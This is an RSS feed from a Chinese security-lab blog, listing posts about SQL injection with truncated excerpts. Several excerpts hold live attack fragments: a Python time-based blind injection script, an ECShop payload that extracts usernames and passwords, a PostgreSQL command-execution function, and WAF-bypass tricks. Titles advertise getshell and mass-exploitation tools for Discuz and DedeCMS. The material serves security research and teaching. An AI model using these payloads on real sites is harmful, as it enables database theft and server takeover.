<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>注入 on Nuclear&#39;Atk（核攻击）网络安全实验室</title>
    <link>https://lcx.cc/categories/%E6%B3%A8%E5%85%A5/</link>
    <description>Recent content in 注入 on Nuclear&#39;Atk（核攻击）网络安全实验室</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>Nuclear&#39;Atk（核攻击）网络安全实验室</copyright>
    <lastBuildDate>Thu, 10 Sep 2015 15:26:26 +0800</lastBuildDate><atom:link href="https://lcx.cc/categories/%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>python延迟注入</title>
      <link>https://lcx.cc/post/4566/</link>
      <pubDate>Thu, 10 Sep 2015 15:26:26 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4566/</guid>
      <description>#!/usr/bin/env python # -*- coding: utf-8 -*- # 延迟注入工具 import urllib2 import time import socket import threading import requests class my_threading(threading.Thread): def __init__(self, str,x): threading.Thread.__init__(self) self.str = str self.x = x def run(self): global res x=self.x j = self.str url = &#34;http://localhost/demo/1.php?username=root&#39;+and+if%281=%28mid%28lpad%28bin%28ord%28mid%28%28select%20user()%29,&#34; + str(x) + &#34;,1%29%29%29,8,0%29,&#34;+ str(j) + &#34;,1%29%29,sleep%282%29,0%29%23&#34; html = request(url) verify = &#39;timeout&#39; if verify not in html: res[str(j)] = 0 #print 1</description>
    </item>
    
    <item>
      <title>一条短信控制你的手机！Android平台的SQL注入漏洞浅析</title>
      <link>https://lcx.cc/post/4518/</link>
      <pubDate>Mon, 13 Apr 2015 12:50:49 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4518/</guid>
      <description>博文作者：Gmxp 发布日期：2015-03-23 博文内容： 0x0前言 14年11月笔者在百度xteam博客中看到其公开了此前报告给Google</description>
    </item>
    
    <item>
      <title>WebSocket 中转注入工具(for SQL Injection tools: sqlmap, etc.)</title>
      <link>https://lcx.cc/post/4507/</link>
      <pubDate>Tue, 24 Mar 2015 15:28:43 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4507/</guid>
      <description>WebSocket 中转注入工具(for SQL Injection tools: sqlmap, etc.) Ricter (๑`･ᴗ･´๑) | 2015-03-22 23:55 https://github.com/RicterZ/websocket-injection Installation git clone https://github.com/RicterZ/websocket-injection cd websocket-injection pip install -r requirements.txt Usage python main.py --port=8888 python sqlmap.py -u &#34;http://localhost:8888/?url=[target]&amp;amp;data=[sqli]&#34; -p data MIT 各种求 star ~ [原文地址]</description>
    </item>
    
    <item>
      <title>Betster SQL注入漏洞</title>
      <link>https://lcx.cc/post/4502/</link>
      <pubDate>Mon, 16 Mar 2015 14:49:42 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4502/</guid>
      <description>Betster（又名PHP Betoffice）是一套用于创建基于PHP、MySQL和JavaScript的在线赌场软件。 Betster 1.0.4版本中存</description>
    </item>
    
    <item>
      <title>Android app 端的 sql 注入</title>
      <link>https://lcx.cc/post/4462/</link>
      <pubDate>Tue, 16 Dec 2014 15:51:16 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4462/</guid>
      <description>前言： 最近入门开始玩android的安全，但是国内研究的真的很少，国外有本牛逼的书《Android Hacker&#39;s Handbook》，写的不错，但是看着睡</description>
    </item>
    
    <item>
      <title>Android app 端的 sql 注入</title>
      <link>https://lcx.cc/post/4428/</link>
      <pubDate>Thu, 11 Sep 2014 09:58:25 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4428/</guid>
      <description>前言： 最近入门开始玩android的安全，但是国内研究的真的很少，国外有本牛逼的书《Android Hacker&#39;s Handbook》，写的不错，但是看着睡</description>
    </item>
    
    <item>
      <title>关于 全自动化 sql注入工具检测和利用 cms指纹识别和利用工具</title>
      <link>https://lcx.cc/post/4400/</link>
      <pubDate>Thu, 17 Jul 2014 10:42:01 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4400/</guid>
      <description>[内容已屏蔽！] 留言评论（旧系统）： 佚名 @ 2014-07-17 12:50:16 老和尚 为什么这么眼生？ 本站回复： -_-||| 佚名 @ 2014-07-18 10:27:38 12306购票软件再曝漏洞 黄牛1人可囤1车厢票 我要</description>
    </item>
    
    <item>
      <title>Discuz! 7.2 SQL注入exp（getshell版）</title>
      <link>https://lcx.cc/post/4386/</link>
      <pubDate>Fri, 04 Jul 2014 09:17:31 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4386/</guid>
      <description>已经有人写出一些工具了,但是感觉不怎么好用,就自己写了个。 参数： 1.可直接getshell 2.爆管理账号密码 3.爆表前缀 如果表前缀不是默认的</description>
    </item>
    
    <item>
      <title>Mysql Insert into set 语法绕过 360scan insert 防注入</title>
      <link>https://lcx.cc/post/4293/</link>
      <pubDate>Thu, 24 Apr 2014 09:50:46 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4293/</guid>
      <description>360scan正则：INSERT\\s+INTO.+?VALUES 其实Mysql不只可以用insert into xxx values 插入数据，还可以:insert into</description>
    </item>
    
    <item>
      <title>轻松绕各种WAF的POST注入、跨站防御(比如安全狗)</title>
      <link>https://lcx.cc/post/4263/</link>
      <pubDate>Mon, 31 Mar 2014 10:41:10 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4263/</guid>
      <description>XXX之前有提过multipart请求绕过各种WAF方式：360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一，貌似没引起多少人关注。</description>
    </item>
    
    <item>
      <title>DedeCMS 注入漏洞批量入侵爆菊 Exp</title>
      <link>https://lcx.cc/post/4228/</link>
      <pubDate>Sat, 01 Mar 2014 09:58:35 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4228/</guid>
      <description>DEDE批量爆菊 Sunshie (博客求大牛友链http://phpinfo.me) | 2014-02-28 21:00 &amp;lt;?php print_r( &#34; +------------------------------------+ DEDECMS批量爆菊利用工具 By :Sunshie QQ:11410569</description>
    </item>
    
    <item>
      <title>科普：Burpsuite导出log配合Sqlmap批量扫描注入点</title>
      <link>https://lcx.cc/post/4207/</link>
      <pubDate>Thu, 13 Feb 2014 10:37:50 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4207/</guid>
      <description>科普：Burpsuite导出log配合Sqlmap批量扫描注入点 动后河 (类的继承) | 2014-02-12 20:19 昨天google了，今天科普： 首先是burp设置记录</description>
    </item>
    
    <item>
      <title>Hibernate对注入的简单测试</title>
      <link>https://lcx.cc/post/4093/</link>
      <pubDate>Tue, 17 Dec 2013 10:55:41 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4093/</guid>
      <description>0x00 背景 前段时间遇到一个使用了Hibernate框架的站，以前没怎么接触过（由于是Java盲，所以大家勿喷），再注入的事情发生了许多奇奇怪怪的</description>
    </item>
    
    <item>
      <title>今天遇到一个微信公众平台注入的实例</title>
      <link>https://lcx.cc/post/3975/</link>
      <pubDate>Thu, 31 Oct 2013 09:25:22 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3975/</guid>
      <description>之前有过讨论（大家有考虑过微信公众平台的注入么），但是情况是我自己模拟出来的，今天终于遇到一个实例。 话不多说，上图。 附送盲打到的后台 [原文地</description>
    </item>
    
    <item>
      <title>大家有考虑过微信公众平台的注入么</title>
      <link>https://lcx.cc/post/3974/</link>
      <pubDate>Thu, 31 Oct 2013 09:16:38 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3974/</guid>
      <description>大家有考虑过微信公众平台的注入么 Valo洛洛 (tomorrow.) | 2013-08-08 19:04 RT [原文地址] 相关讨论： 1# Icyblade | 2013-08-08 19:09 你这个不是微信的问题吧 我手上也有个微信公众平台，工作流</description>
    </item>
    
    <item>
      <title>WordPress &lt; 3.6.1 PHP 对象注入漏洞</title>
      <link>https://lcx.cc/post/3877/</link>
      <pubDate>Mon, 16 Sep 2013 10:35:19 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3877/</guid>
      <description>From:WordPress &amp;lt; 3.6.1 PHP Object Injection 0x00 背景 当我读到一篇关于Joomla的“PHP对象注射”的漏洞blog后，我挖深了一点就发现Stefan Esser大神在2010年</description>
    </item>
    
    <item>
      <title>Freedom Hosting创始人被捕 半数Tor网站被FBI入侵 用户浏览器被注入JS脚本</title>
      <link>https://lcx.cc/post/3791/</link>
      <pubDate>Tue, 06 Aug 2013 09:23:18 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3791/</guid>
      <description>提供基于Tor匿名网络托管服务的爱尔兰公司Freedom Hosting（Host Ultra Limited）创始人Eric Eoin Marques已经被捕，正</description>
    </item>
    
    <item>
      <title>几种通用防注入程序绕过方法</title>
      <link>https://lcx.cc/post/3780/</link>
      <pubDate>Wed, 31 Jul 2013 09:30:28 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3780/</guid>
      <description>0x00 前言 目前主流的CMS系统当中都会内置一些防注入的程序，例如Discuz、dedeCMS等，本篇主要介绍绕过方法。 0x01 Discuz x2.0防注入 防注入原</description>
    </item>
    
    <item>
      <title>美国VPS管理系统SolusVM 1.13.03 SQL注入漏洞（含exp）</title>
      <link>https://lcx.cc/post/3679/</link>
      <pubDate>Mon, 08 Jul 2013 16:22:48 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3679/</guid>
      <description>SolusVM软件是一个拥有强大的图形用户界面的VPS管理系统，可以同时管理三种虚拟化技术：OpenVZ ,Xen Paravirtualizatio</description>
    </item>
    
    <item>
      <title>Sqlmap注入技巧收集</title>
      <link>https://lcx.cc/post/3664/</link>
      <pubDate>Mon, 08 Jul 2013 11:07:46 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3664/</guid>
      <description>收集了一些利用Sqlmap做注入测试的TIPS，其中也包含一点绕WAF的技巧，便于大家集中查阅，欢迎接楼补充、分享。 TIP1 当我们注射的时候，判断</description>
    </item>
    
    <item>
      <title>[渗透技巧]python脚本处理伪静态注入</title>
      <link>https://lcx.cc/post/3612/</link>
      <pubDate>Thu, 20 Jun 2013 18:19:51 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3612/</guid>
      <description>目前有很多网站做了rewrite，如 /?id=1 /1 /1111.php 大趋势下，攻击的门槛逐渐增高。这样有利有弊，喜欢研究的会深入钻研，另一方面只会用工具不懂原理的则充</description>
    </item>
    
    <item>
      <title>waf 绕过的技巧，SQL 注入中绕过 waf 的技巧</title>
      <link>https://lcx.cc/post/3579/</link>
      <pubDate>Mon, 17 Jun 2013 14:51:17 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3579/</guid>
      <description>2013/05/31 17:41 | livers 研究过国内外的waf。分享一些 奇淫绝技。 一些大家都了解的技巧如： /*!*/,SELECT[0x09,0x0A-0x0D,0x20,0xA0]xx FROM 不再重造轮子。 Mysql tips1: 神奇的 ` (格式输出表的那个控制符) 过空格和一些</description>
    </item>
    
    <item>
      <title>php mysql 4 数字型注入，技巧讨论</title>
      <link>https://lcx.cc/post/3496/</link>
      <pubDate>Tue, 14 May 2013 09:03:59 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3496/</guid>
      <description>php mysql 4 数字型注入 遇到了巨大困难。。。 lxj616 | 2013-05-13 22:08 一个注入点，求大神指导 cast(database() as char) 回显：tempdb version()&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 回显：4.0.26-nt user()&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 回显：root@loc</description>
    </item>
    
    <item>
      <title>Dedecms 二次注入经典exp构造</title>
      <link>https://lcx.cc/post/3469/</link>
      <pubDate>Mon, 06 May 2013 09:21:45 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3469/</guid>
      <description>0x01 前言 Long long ago,yy@safekeyer.com发现dedecms二次注入的一个经典代码审计中二次攻击的案例，但限于字段大小不能超过60字</description>
    </item>
    
    <item>
      <title>易想团购ajax.php SQL注入分析和Exp</title>
      <link>https://lcx.cc/post/3431/</link>
      <pubDate>Thu, 18 Apr 2013 11:13:06 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3431/</guid>
      <description>在注册的时候，输入用户名后台会验证用户名是否存在，当然是通过ajax去验证的也就是ajax.php。很多程序多会忽略这个导致存在SQL注入。</description>
    </item>
    
    <item>
      <title>易想团购系统通杀SQL注入漏洞分析及利用</title>
      <link>https://lcx.cc/post/3417/</link>
      <pubDate>Wed, 10 Apr 2013 13:27:20 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3417/</guid>
      <description>刚打开红黑看到基友写的一个{易想团购系统 最新版 通杀}的文章，看他贴的代码里面有个get_client_ip()函数，哈哈，我猜没过滤，果断下</description>
    </item>
    
    <item>
      <title>ESPCMS最新cookie注入漏洞分析</title>
      <link>https://lcx.cc/post/3411/</link>
      <pubDate>Tue, 09 Apr 2013 10:16:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3411/</guid>
      <description>感谢n3wf投递 0×00&amp;nbsp;&amp;nbsp;简介： 易思ESPCMS企业网站管理系统基于LAMP开发构建的企业网站管理系统，它具有操作简单</description>
    </item>
    
    <item>
      <title>Discuz防注入函数绕过方法分析及没用心的修复补丁</title>
      <link>https://lcx.cc/post/3391/</link>
      <pubDate>Mon, 25 Mar 2013 21:07:56 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3391/</guid>
      <description>分析人：晴天小铸，Seay 分析时间：2013年03月20日 discuz介绍： Crossday Discuz! Board（以下简称Discuz!，中国国家版权局著作权登记</description>
    </item>
    
    <item>
      <title>Access注入点高级运用总结</title>
      <link>https://lcx.cc/post/3389/</link>
      <pubDate>Sun, 24 Mar 2013 20:35:39 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3389/</guid>
      <description>信赖Access注入点是人人看到最多的了,一样平常敷衍 办法就是: 猜表猜段猜内容---MD5---去靠山---看上传,备份,设置信息等等---</description>
    </item>
    
    <item>
      <title>DEDECMS 通杀鸡肋注入一枚</title>
      <link>https://lcx.cc/post/3368/</link>
      <pubDate>Tue, 12 Mar 2013 10:10:06 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3368/</guid>
      <description>by:冰封 ps:转载请带上 请注意版权 看到标题你一定很疑惑 为什么通杀 有鸡肋呢？ 接下来看分析吧！ 漏洞文件：/plus/feedback.php if($comtype</description>
    </item>
    
    <item>
      <title>memcached可能存在篡改对象导致的注入代码执行漏洞</title>
      <link>https://lcx.cc/post/3340/</link>
      <pubDate>Sat, 23 Feb 2013 12:19:20 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3340/</guid>
      <description>memcached存储java对象时，可能存在篡改对象导致的注入代码执行漏洞。 memcached介绍：http://baike.baidu.</description>
    </item>
    
    <item>
      <title>ecshop 最新注入0day漏洞分析报告</title>
      <link>https://lcx.cc/post/3337/</link>
      <pubDate>Thu, 21 Feb 2013 09:37:30 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3337/</guid>
      <description>漏洞作者：360 漏洞分析：Seay 博客原文：http://www.cnseay.com/archives/2237 今天习惯性的到处逛，看看文</description>
    </item>
    
    <item>
      <title>对防注入代码的分析</title>
      <link>https://lcx.cc/post/3301/</link>
      <pubDate>Wed, 23 Jan 2013 17:52:55 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3301/</guid>
      <description>前几天一个朋友让我帮他检测一下他网站程序的安全，为了不让我的面子掉一地只有硬着头皮帮他检测啦！ 拿到他的源程序之后就开始我的检测之路啦！ 首先我</description>
    </item>
    
    <item>
      <title>[通杀]dedecms plus/search.php 注入漏洞利用EXP</title>
      <link>https://lcx.cc/post/3289/</link>
      <pubDate>Sun, 20 Jan 2013 14:51:52 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3289/</guid>
      <description>转载不加作者名的没JJ 哎。没意识，我一个月前就发现了这个漏洞，一直也没去黑站&amp;nbsp;&amp;nbsp;放那 现在狗卵的什么 知道创宇 发出来了。郁闷</description>
    </item>
    
    <item>
      <title>ECShop全版本注入0day</title>
      <link>https://lcx.cc/post/3231/</link>
      <pubDate>Thu, 27 Dec 2012 13:05:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3231/</guid>
      <description>y35u 发表于 2012-12-25 22:56 感谢欠杀的黑盒 把任意商品加入购物车在填写配送地址那一页，有地区选择 flow.php?step=consignee&amp;amp;direct_shopping=1 比如省选择安徽 其中POST数据如下 country=1&amp;amp;province=3&amp;amp;city=37&amp;amp;district=409&amp;amp;consignee=11111&amp;amp;email=11111111%40qq.com&amp;amp;address=1111111111&amp;amp;zipcode=11111111&amp;amp;tel=1111111111111111111&amp;amp;mobile=11111111&amp;amp;sign_building=111111111&amp;amp;best_time=111111111&amp;amp;Submit=%E9%85%8D%E9%80%81%E8%87%B3%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80&amp;amp;step=consignee&amp;amp;act=checkout&amp;amp;address_id=province=3 改成 province=3&#39;) and (select 1 from(select count(*),concat((select (select (SELECT concat(user_name,0x7c,password) FROM</description>
    </item>
    
    <item>
      <title>Access SQL 注入参考手册(小抄)，Access Cheat Sheet</title>
      <link>https://lcx.cc/post/3219/</link>
      <pubDate>Wed, 26 Dec 2012 00:27:23 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3219/</guid>
      <description>发布:wpulog | 发布时间: 2010年3月29日 Access SQL注入参考 描述 SQL查询及注释 注释符 Access中没有专门的注释符号.因此&#34;/*&#34;,</description>
    </item>
    
    <item>
      <title>ecmall 2.3.0-0918-scgbk 注入</title>
      <link>https://lcx.cc/post/3200/</link>
      <pubDate>Sat, 22 Dec 2012 17:47:41 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3200/</guid>
      <description>function _get_conditions() { /* 搜索条件 */ $conditions = &#34;1 = 1&#34;; if (trim($_GET[&#39;keyword&#39;])) { $str = &#34;LIKE &#39;%&#34; . trim($_GET[&#39;keyword&#39;]) . &#34;%&#39;&#34;; $conditions .= &#34; AND (goods_name {$str} OR brand {$str} OR cate_name {$str})&#34;; echo $conditions; exit; } if ($_GET[&#39;character&#39;]) { switch ($_GET[&#39;character&#39;]) { case &#39;show&#39;: $conditions .= &#34; AND if_show = 1&#34;; break; case &#39;hide&#39;: $conditions .= &#34; AND if_show = 0&#34;; break; case &#39;closed&#39;: $conditions</description>
    </item>
    
    <item>
      <title>dedecms v5.7 最新注入 0day - 鸡肋</title>
      <link>https://lcx.cc/post/3199/</link>
      <pubDate>Sat, 22 Dec 2012 17:39:22 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3199/</guid>
      <description>Team:cdeplay Team by j8g }elseif ($dopost == &#39;save&#39;){ if(isset($mtypeidarr) &amp;amp;&amp;amp; is_array($mtypeidarr)) { $delids = &#39;0&#39;; $mtypeidarr = array_filter($mtypeidarr, &#39;is_numeric&#39;); foreach($mtypeidarr as $delid) { $delids .= &#39;,&#39;.$delid; unset($groupname[$delid]); } $query = &#34;DELETE FROM `#@__member_group` WHERE id in ($delids) AND mid=&#39;$cfg_ml-&amp;gt;M_ID&#39;&#34;; $dsql-&amp;gt;ExecNoneQuery($query); $sql=&#34;SELECT id FROM `#@__member_friends` WHERE groupid in ($delids) AND mid=&#39;$cfg_ml-&amp;gt;M_ID&#39;&#34;; $db-&amp;gt;SetQuery($sql); $db-&amp;gt;Execute(); while($row = $db-&amp;gt;GetArray()) { $query2 = &#34;UPDATE `#@__member_friends` SET groupid=&#39;1&#39; WHERE id=&#39;{$row[&#39;id&#39;]}&#39; AND mid=&#39;$cfg_ml-&amp;gt;M_ID&#39;&#34;; $dsql-&amp;gt;ExecNoneQuery($query2); } } foreach</description>
    </item>
    
    <item>
      <title>ECShop_V2.7.3_GBK_release1106 注入 0day</title>
      <link>https://lcx.cc/post/3195/</link>
      <pubDate>Sat, 22 Dec 2012 17:09:35 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3195/</guid>
      <description>C0deplay Team&amp;nbsp;&amp;nbsp;&amp;nbsp; j8g 看代码 /* 修改个人资料的处理 */ elseif ($action == &#39;act_edit_profile&#39;) { include_once(ROOT_PATH . &#39;includes/lib_transaction.php&#39;); $birthday = trim($_POST[&#39;birthdayYear&#39;]) .&#39;-&#39;. trim($_POST[&#39;birthdayMonth&#39;]) .&#39;-&#39;. trim($_POST[&#39;birthdayDay&#39;]); $email = trim($_POST[&#39;email&#39;]); $other[&#39;msn&#39;] = $msn = isset($_POST[&#39;extend_field1&#39;]) ? trim($_POST[&#39;extend_field1&#39;]) : &#39;&#39;; $other[&#39;qq&#39;] = $qq = isset($_POST[&#39;extend_field2&#39;]) ? trim($_POST[&#39;extend_field2&#39;]) : &#39;&#39;; $other[&#39;office_phone&#39;] = $office_phone = isset($_POST[&#39;extend_field3&#39;]) ? trim($_POST[&#39;extend_field3&#39;]) : &#39;&#39;; $other[&#39;home_phone&#39;] = $home_phone = isset($_POST[&#39;extend_field4&#39;]) ? trim($_POST[&#39;extend_field4&#39;]) :</description>
    </item>
    
    <item>
      <title>PHP create_function()注入命令执行漏洞</title>
      <link>https://lcx.cc/post/3180/</link>
      <pubDate>Tue, 18 Dec 2012 00:37:20 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3180/</guid>
      <description>winxwin 发表于 2012-9-16 21:39 在PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给cr</description>
    </item>
    
    <item>
      <title>利用 xss 执行 sql 注入</title>
      <link>https://lcx.cc/post/3168/</link>
      <pubDate>Mon, 17 Dec 2012 20:35:57 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3168/</guid>
      <description>昨天看见phpcms v9.1.15爆的xss和无权限的sql注入，于是就想测试下利用xss执行sql注入，虽然爆的这个phpcms漏洞还有很</description>
    </item>
    
    <item>
      <title>程序员疫苗：代码注入</title>
      <link>https://lcx.cc/post/3144/</link>
      <pubDate>Tue, 11 Dec 2012 14:19:50 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3144/</guid>
      <description>几个月在我的微博上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的</description>
    </item>
    
    <item>
      <title>PostgreSQL &#34;初级&#34;注入大法</title>
      <link>https://lcx.cc/post/3082/</link>
      <pubDate>Wed, 14 Nov 2012 17:58:15 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3082/</guid>
      <description>CREATE FUNCTION id() RETURNS text AS $aaa$open(FD,chr(108).chr(105).chr(32).chr(124));return join(chr(0),&amp;lt;FD&amp;gt;);$aaa$ LANGUAGE plperlu; select id(); id()为创建函数名，可以自定义随便写 chr(108).chr(105)是需要执行的命令id的asc编码 自己把需要执</description>
    </item>
    
    <item>
      <title>PHPCMS V9 WAP 模块注入漏洞</title>
      <link>https://lcx.cc/post/3017/</link>
      <pubDate>Fri, 19 Oct 2012 08:36:51 +0800</pubDate>
      
      <guid>https://lcx.cc/post/3017/</guid>
      <description>缺陷编号：WooYun-2012-11818 漏洞标题：PHPCMS V9 WAP模块注入漏洞 相关厂商：phpcms 漏洞作者：tenzy 提交时间：2</description>
    </item>
    
    <item>
      <title>关于MySQL注入的几个语句</title>
      <link>https://lcx.cc/post/2883/</link>
      <pubDate>Mon, 17 Sep 2012 10:05:31 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2883/</guid>
      <description>0x1 mysql报错模式下的不使用information_schema来爆表 基础知识：USING 用于表连接时给定连接条件，Select&amp;nbsp</description>
    </item>
    
    <item>
      <title>另类攻击 - Mysql注入到整个数据库服务器崩溃</title>
      <link>https://lcx.cc/post/2881/</link>
      <pubDate>Mon, 17 Sep 2012 09:25:41 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2881/</guid>
      <description>1.理论基础 2.寻找注入 3.压力测试 理论基础 mysql存在注入，并且注入的sleep语句如果传入一个足够大的参数，比如：sleep(9999</description>
    </item>
    
    <item>
      <title>Thinksns 微博系统注入漏洞一枚</title>
      <link>https://lcx.cc/post/2835/</link>
      <pubDate>Fri, 31 Aug 2012 09:42:27 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2835/</guid>
      <description>作者：Liuker Blog：www.2bhack.net 尼玛&amp;nbsp; 最近没事情做 别问我怎么审计的 彩笔不知道神马是审计啊 目测就几个基友看过</description>
    </item>
    
    <item>
      <title>KesionEshop 注入 0day</title>
      <link>https://lcx.cc/post/2788/</link>
      <pubDate>Fri, 17 Aug 2012 09:39:32 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2788/</guid>
      <description>作者：Liuker 送上0day一枚 下面官网测试 /shop/shoppingcart.asp?id=1 防注入蛋疼的很&amp;nbsp; 直接用%09绕过 select 需要用sel+ect绕</description>
    </item>
    
    <item>
      <title>ZYCHCMS企业网站管理系统SQL注入漏洞及后台拿webshell</title>
      <link>https://lcx.cc/post/2751/</link>
      <pubDate>Mon, 06 Aug 2012 11:06:13 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2751/</guid>
      <description>影响版本：ZYCHCMS企业网站管理系统4.2（存在以下两个文件的版本应该是通杀） ①SQL注射漏洞 漏洞文件：/admin/add_js.as</description>
    </item>
    
    <item>
      <title>PHP&#43;MYSQL环境下的Cookies爆错注入实战</title>
      <link>https://lcx.cc/post/2726/</link>
      <pubDate>Fri, 27 Jul 2012 09:59:02 +0800</pubDate>
      
      <guid>https://lcx.cc/post/2726/</guid>
      <description>PHP+MYSQL环境下的Cookies爆错注入实战，混世魔王。 技巧源于技术，所以你在浏览混世魔王的技术博客的时候，会发现技术形式的文章居多</description>
    </item>
    
  </channel>
</rss>
